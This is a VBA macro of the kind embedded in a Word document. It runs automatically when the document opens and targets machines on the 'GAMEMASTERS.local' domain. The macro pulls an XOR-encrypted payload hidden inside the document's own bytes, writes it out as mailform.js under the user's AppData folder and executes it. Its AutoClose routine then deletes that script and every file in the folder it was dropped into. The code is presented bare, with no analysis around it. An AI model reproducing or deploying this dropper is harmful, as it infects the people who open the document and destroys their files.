Public IAiiymixt As String
Public kWXlyKwVj As String


Function Decrypt(given_string() As Byte, length As Long) As Boolean
        Dim xor_key As Byte
        xor_key = 45
        For i = 0 To length - 1
                given_string(i) = given_string(i) Xor xor_key
                xor_key = ((xor_key Xor 99) Xor (i Mod 254))
        Next i
        Decrypt = True
End Function

Sub AutoClose() 'delete the js script'
        On Error Resume Next
        Kill IAiiymixt
        On Error Resume Next
        Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
        aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
        Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
        On Error GoTo __exit
        Dim chkDomain As String
        Dim strUserDomain As String
        chkDomain = "GAMEMASTERS.local"
        strUserDomain = Environ$("UserDomain")
        If chkDomain <> strUserDomain Then

        Else
                REM load file to buffer
                Dim file
                Dim file_length As Long
                Dim length As Long
                file_length = FileLen(ActiveDocument.FullName)
                file = FreeFile
                Open (ActiveDocument.FullName) For Binary As #file
                Dim buffer() As Byte
                ReDim buffer(file_length)
                Get #file, 1, buffer

                Dim file_content As String
                file_content = StrConv(buffer, vbUnicode)
                Dim match, matches
                Dim regex
                Set regex = CreateObject("vbscript.regexp")
                regex.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
                Set matches = regex.Execute(file_content)
                Dim payload_offset
                If matches.Count = 0 Then
                        GoTo __exit
                End If
                For Each match In matches
                        payload_offset = match.FirstIndex
                Exit For
                Next
                Dim payload_buffer() As Byte
                Dim payload_size As Long
                payload_size = 13082
                ReDim payload_buffer(payload_size)
                Get #file, payload_offset + 81, payload_buffer
                If Not Decrypt(payload_buffer(), payload_size + 1) Then
                        GoTo __exit
                End If
                kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
                Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
                If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
                        kWXlyKwVj = Environ("appdata")
                End If
                Set aMUsvgOin = Nothing
                Dim K764B5Ph46Vh
                K764B5Ph46Vh = FreeFile
                IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
                Open (IAiiymixt) For Binary As #K764B5Ph46Vh
                Put #K764B5Ph46Vh, 1, payload_buffer
                Close #K764B5Ph46Vh
                Erase payload_buffer
                Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
                R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
                ActiveDocument.Save
                Exit Sub
                __exit:
                Close #K764B5Ph46Vh
                ActiveDocument.Save
        End If
End Sub